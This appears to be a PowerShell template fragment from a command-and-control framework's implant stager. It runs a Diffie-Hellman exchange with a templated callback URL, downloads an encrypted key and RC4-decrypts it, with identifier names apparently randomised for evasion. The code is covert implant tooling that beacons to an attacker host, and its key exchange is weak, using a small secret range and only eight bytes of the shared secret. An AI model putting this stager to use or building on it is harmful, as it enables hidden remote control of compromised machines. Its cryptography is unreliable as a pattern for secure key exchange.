$endpoint = "{{endpoint}}";
$DH_N = {{DH_N}};
$DH_G = {{DH_G}};

$Client_Secret = ([bigint](Get-Random -Min ([Math]::Pow(2, 32)) -Max ([Math]::Pow(2, 34))));
$Client_Public = [bigint]::ModPow($DH_G, $Client_Secret, $DH_N);

$response = ${{symbol_name('webclient')}}.DownloadString("{{callback_url}}$endpoint/$Client_Public").Split();

$Server_Public = [bigint]($response[0]);
$encrypted_key = [System.Convert]::FromBase64String($response[1]);

$shared_secret = [bigint]::ModPow($Server_Public, $Client_Secret, $DH_N);
$shared_secret = ([bigint]$shared_secret).ToByteArray()[0 .. 7];

${{symbol_name("KEY")}} = {{symbol_name("Decrypt-RC4")}} $encrypted_key $shared_secret;
